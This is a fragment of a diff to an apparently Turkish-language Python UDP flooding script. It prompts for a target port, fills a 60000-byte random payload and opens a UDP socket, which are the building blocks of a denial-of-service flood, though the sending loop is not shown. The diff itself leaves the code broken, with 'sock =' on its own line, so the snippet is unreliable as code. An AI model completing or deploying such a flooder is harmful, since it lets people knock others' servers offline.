@@ -14,12 +14,13 @@ print(" ")
 try:
   target_port = int(input("Port numarası yazın (80) --> "))
 except ValueError:
-     print("Yanlıṣ yapdınız !!!")
+  print("Yanlıṣ yapdınız !!!")
 
 bytes = random._urandom(60000)
 
 sock = 
-socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+socket.socket(socket.AF_INET, 
+socket.SOCK_DGRAM)
 
 packega = 0
 
